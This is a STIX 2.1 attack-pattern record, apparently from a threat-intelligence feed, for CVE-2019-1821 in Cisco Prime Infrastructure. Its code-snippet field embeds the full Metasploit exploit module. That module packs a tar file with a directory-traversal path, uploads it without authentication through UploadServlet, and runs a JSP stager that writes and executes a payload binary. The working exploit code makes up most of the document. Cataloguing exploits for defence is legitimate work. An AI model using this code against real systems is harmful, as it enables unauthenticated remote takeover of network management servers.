{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f76fe2a0-2b75-42eb-810b-4b1071168239",
    "created": "2024-08-14T17:01:22.434112Z",
    "modified": "2024-08-14T17:01:22.434117Z",
    "name": "Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability",
    "description": " This module exploits a vulnerability found in Cisco Prime Infrastructure. The issue is that the TarArchive Java class the HA Health Monitor component uses does not check for any directory traversals while unpacking a Tar file, which can be abused by a remote user to leverage the UploadServlet class to upload a JSP payload to the Apache Tomcat's web apps directory, and gain arbitrary remote code execution. Note that authentication is not required to exploit this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cpi_tararchive_upload.rb",
            "external_id": "cpi_tararchive_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-1821"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190515-pi-rce"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/advisories/src-2019-0034/"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/pocs/src-2019-0034.py.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability',\n      'Description'    => %q{\n        This module exploits a vulnerability found in Cisco Prime Infrastructure. The issue is that\n        the TarArchive Java class the HA Health Monitor component uses does not check for any\n        directory traversals while unpacking a Tar file, which can be abused by a remote user to\n        leverage the UploadServlet class to upload a JSP payload to the Apache Tomcat's web apps\n        directory, and gain arbitrary remote code execution. Note that authentication is not\n        required to exploit this vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Steven Seeley', # Original discovery, PoC\n          'sinn3r'         # Metasploit module\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          [ 'Cisco Prime Infrastructure 3.4.0.0', { } ]\n        ],\n      'References'     =>\n        [\n          ['CVE', '2019-1821'],\n          ['URL', 'https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html'],\n          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190515-pi-rce'],\n          ['URL', 'https://srcincite.io/advisories/src-2019-0034/'],\n          ['URL', 'https://srcincite.io/pocs/src-2019-0034.py.txt']\n        ],\n      'DefaultOptions' =>\n        {\n          'RPORT' => 8082,\n          'SSL'   => true,\n\n        },\n      'Notes'          =>\n        {\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ]\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2019-05-15',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('WEBPORT', [true, 'Cisco Prime Infrastructure web interface', 443]),\n        OptString.new('TARGETURI', [true, 'The route for Cisco Prime Infrastructure web interface', '/'])\n      ])\n  end\n\n  class CPITarArchive\n    attr_reader :data\n    attr_reader :jsp_name\n    attr_reader :tar_name\n    attr_reader :stager\n    attr_reader :length\n\n    def initialize(name, stager)\n      @jsp_name = \"#{name}.jsp\"\n      @tar_name = \"#{name}.tar\"\n      @stager = stager\n      @data = make\n      @length = data.length\n    end\n\n    def make\n      data = ''\n      path = \"../../opt/CSCOlumos/tomcat/webapps/ROOT/#{jsp_name}\"\n      tar = StringIO.new\n      Rex::Tar::Writer.new(tar) do |t|\n        t.add_file(path, 0644) do |f|\n          f.write(stager)\n        end\n      end\n      tar.seek(0)\n      data = tar.read\n      tar.close\n      data\n    end\n  end\n\n  def check\n    res = send_request_cgi({\n      'rport'  => datastore['WEBPORT'],\n      'SSL'    => true,\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'webacs', 'pages', 'common', 'login.jsp')\n    })\n\n    unless res\n      vprint_error('No response from the server')\n      return CheckCode::Unknown\n    end\n\n    if res.code == 200 && res.headers['Server'] && res.headers['Server'] == 'Prime'\n      return CheckCode::Detected\n    end\n\n    CheckCode::Safe\n  end\n\n  def get_jsp_stager(out_file, bin_data)\n    # For some reason, some of the bytes tend to get lost at the end.\n    # Not really sure why, but some extra bytes are added to ensure the integrity\n    # of the code. This file will get deleted during cleanup anyway.\n    %Q|<%@ page import=\"java.io.*\" %>\n    <%\n      String data = \"#{Rex::Text.to_hex(bin_data, '')}\";\n      FileOutputStream outputstream = new FileOutputStream(\"#{out_file}\");\n      int numbytes = data.length();\n      byte[] bytes = new byte[numbytes/2];\n      for (int counter = 0; counter < numbytes; counter += 2)\n      {\n        char char1 = (char) data.charAt(counter);\n        char char2 = (char) data.charAt(counter + 1);\n        int comb = Character.digit(char1, 16) & 0xff;\n        comb <<= 4;\n        comb += Character.digit(char2, 16) & 0xff;\n        bytes[counter/2] = (byte)comb;\n      }\n      outputstream.write(bytes);\n      outputstream.close();\n      try {\n        Runtime.getRuntime().exec(\"chmod +x #{out_file}\");\n        Runtime.getRuntime().exec(\"#{out_file}\");\n      } catch (IOException exp) {}\n    %>#{Rex::Text.rand_text_alpha(30)}|\n  end\n\n  def make_tar\n    elf_name = \"/tmp/#{Rex::Text.rand_text_alpha(10)}.bin\"\n    register_file_for_cleanup(elf_name)\n    elf = generate_payload_exe(code: payload.encoded)\n    jsp_stager = get_jsp_stager(elf_name, elf)\n    tar_name = Rex::Text.rand_text_alpha(10)\n    register_file_for_cleanup(\"apache-tomcat-8.5.16/webapps/ROOT/#{tar_name}.jsp\")\n    CPITarArchive.new(tar_name, jsp_stager)\n  end\n\n  def execute_payload(tar)\n    # Once executed, we are at:\n    # /opt/CSCOlumos\n    send_request_cgi({\n      'rport'  => datastore['WEBPORT'],\n      'SSL'    => true,\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, tar.jsp_name)\n    })\n  end\n\n  def upload_tar(tar)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(tar.data, nil, nil, \"form-data; name=\\\"files\\\"; filename=\\\"#{tar.tar_name}\\\"\")\n\n    # The file gets uploaded to this path on the server:\n    # /opt/CSCOlumos/apache-tomcat-8.5.16/webapps/ROOT/tar_name.jsp\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'servlet', 'UploadServlet'),\n      'data'   => post_data.to_s,\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'headers' =>\n        {\n          'Destination-Dir' => 'tftpRoot',\n          'Compressed-Archive' => 'false',\n          'Primary-IP' => '127.0.0.1',\n          'Filecount' => '1',\n          'Filename' => tar.tar_name,\n          'FileSize' => tar.length\n        }\n    })\n\n    (res && res.code == 200)\n  end\n\n  def exploit\n    tar = make_tar\n    print_status(\"Uploading tar file (#{tar.length} bytes)\")\n    if upload_tar(tar)\n      print_status('Executing JSP stager...')\n      execute_payload(tar)\n    else\n      print_status(\"Failed to upload #{tar.tar_name}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-05-15",
    "x_mitre_platforms": [
        "linux'"
    ]
}